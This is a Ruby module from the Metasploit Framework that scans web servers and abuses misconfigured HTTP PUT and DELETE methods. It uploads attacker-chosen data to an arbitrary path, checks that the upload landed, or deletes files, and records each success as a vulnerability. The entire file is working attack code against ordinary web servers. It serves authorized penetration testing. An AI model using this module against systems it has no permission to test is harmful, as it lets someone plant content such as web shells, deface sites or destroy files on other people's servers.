##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'HTTP Writable Path PUT/DELETE File Access',
			'Version'     => '$Revision$',
			'Description'    => %q{
					This module can abuse misconfigured web servers to
				upload and delete web content via PUT and DELETE HTTP
				requests. Set ACTION to either PUT or DELETE. PUT is the
				default.
			},
			'Author'      =>
				[
					'Kashif [at] compulife.com.pk', 'CG'
				],
			'License'     => MSF_LICENSE,
			'References' => 
			[
				[ 'OSVDB', '397'],
                        ],
			'Actions'     =>
				[
					['PUT'],
					['DELETE']
				],
			'DefaultAction' => 	'PUT'
		)

		register_options(
			[
				OptString.new('PATH', [ true,  "The path to attempt to write or delete", "/msf_http_put_test.txt"]),
				OptString.new('DATA', [ false,  "The data to upload into the file", "msf test file"]),
			], self.class)
	end

	def run_host(ip)

		target_host = ip
		target_port = datastore['RPORT']

		case action.name
		when 'PUT'
			begin
				res = send_request_cgi({
					'uri'          =>  datastore['PATH'],
					'method'       => 'PUT',
					'ctype'        => 'text/plain',
					'data'         => datastore['DATA']
				}, 20)

				if (res.nil?)
					print_error("No response for #{ip}:#{rport}")
				elsif (res and res.code >= 200 and res.code < 300)

					#
					# Detect if file was really uploaded
					#
					begin
						res = send_request_cgi({
							'uri'  		=>  datastore['PATH'],
							'method'   	=> 'GET',
							'ctype'		=> 'text/html'
						}, 20)

						if (res.nil?)
							print_error("no response for #{ip}:#{rport}")
						elsif res and (res.code >= 200 and res.code <= 299)
							if res.body.include? datastore['DATA']
								print_good("Upload succeeded on #{ip}:#{rport}#{datastore['PATH']} [#{res.code}]")
								report_vuln(
									:host	=> target_host,
									:port	=> rport,
									:proto	=> 'tcp',
									:sname	=> 'http',
									:name	=> self.fullname,
									:info	=> "PUT ENABLED",
									:refs	=> self.references,
									:exploited_at => Time.now.utc
								)
							end
						else
							print_error("Received a #{res.code} code, upload failed on #{ip}:#{rport}#{datastore['PATH']} [#{res.code} #{res.message}]")
						end

					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
						print_error "No connection"
					rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
					print_error e.message
					end
				elsif(res.code == 302 or res.code == 301)
					print_status("Received #{res.code} Redirect to #{res.headers['Location']}")
				else
					print_error("Received #{res.code} code, upload failed on #{ip}:#{rport} #{datastore['PATH']} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				#print_error "No connection"
			rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
				print_error e.message
			end

		when 'DELETE'
			begin
				res = send_request_cgi({
					'uri'          => datastore['PATH'],
					'method'       => 'DELETE'
				}, 10)

				return if not res
				if (res and res.code >= 200 and res.code < 300)
					print_good("Delete succeeded on #{ip}:#{rport}#{datastore['PATH']} [#{res.code}]")

					report_vuln(
						:host	=> target_host,
						:port	=> rport,
						:proto	=> 'tcp',
						:sname	=> 'http',
						:name 	=> self.fullname,
						:info 	=> "DELETE ENABLED",
						:refs 	=> self.references,
						:exploited_at => Time.now.utc
					)

				else
					print_error("Delete failed #{ip}:#{rport} [#{res.code} #{res.message}]")
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
				#print_error "No connection"
			rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH => e
				print_error e.message
			end
		end
	end
end
